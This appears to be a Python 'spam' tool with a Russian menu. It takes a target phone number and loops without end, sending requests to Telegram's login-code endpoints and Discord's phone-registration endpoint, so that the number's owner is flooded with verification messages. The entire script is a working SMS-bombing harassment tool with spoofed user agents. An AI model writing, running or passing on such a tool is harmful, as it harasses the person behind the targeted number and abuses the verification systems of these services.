import requests 
import fake_useragent
from pystyle import Colors, Colorate
import time
import subprocess
import os 

os.system('cls' if os.name == 'nt' else 'clear')

banner = """

████████╗░█████╗░██╗░░░██╗██╗░░░░░░█████╗░██████╗░
╚══██╔══╝██╔══██╗╚██╗░██╔╝██║░░░░░██╔══██╗██╔══██╗
░░░██║░░░███████║░╚████╔╝░██║░░░░░██║░░██║██████╔╝
░░░██║░░░██╔══██║░░╚██╔╝░░██║░░░░░██║░░██║██╔══██╗
░░░██║░░░██║░░██║░░░██║░░░███████╗╚█████╔╝██║░░██║
░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝░╚════╝░╚═╝░░╚═╝

    ░██████╗██████╗░░█████╗░███╗░░░███╗
    ██╔════╝██╔══██╗██╔══██╗████╗░████║
    ╚█████╗░██████╔╝███████║██╔████╔██║
    ░╚═══██╗██╔═══╝░██╔══██║██║╚██╔╝██║
    ██████╔╝██║░░░░░██║░░██║██║░╚═╝░██║
    ╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝

    ╔══════════════════════════════════╗
    ║##################################║
    ║#                                #║
    ║#           [1] спам             #║
    ║#                                #║
    ║#          [99] выход            #║
    ║#                                #║
    ║###############KIT################║
    ╚══════════════════════════════════╝
"""
print(Colorate.Vertical(Colors.blue_to_red, banner))
choice = input(Colorate.Horizontal(Colors.green_to_blue,'выбирай'))

if choice == "1":
    user = fake_useragent.UserAgent().random
    headers = {'user_agent' : user}
    number = int(input(Colorate.Horizontal(Colors.green_to_blue,'Введите номер телефона ->  ')))
    count = 0
    nomer = number
    support = input(Colorate.Horizontal(Colors.green_to_blue,'Нажмите ENTER '))
    time.sleep(15)
    print(Colorate.Horizontal(Colors.green_to_blue,'\nготово'))    
    print(Colorate.Horizontal(Colors.green_to_blue,'Нажмите ENTER для выхода'))

    try:
      while True:
        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
        print(number)
        count += 1
        print("Отправлено", {count})
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_yellow,'Ошибка'))

elif choice == "99":
    subprocess.run(['python','main.py'])

else:
   exit()
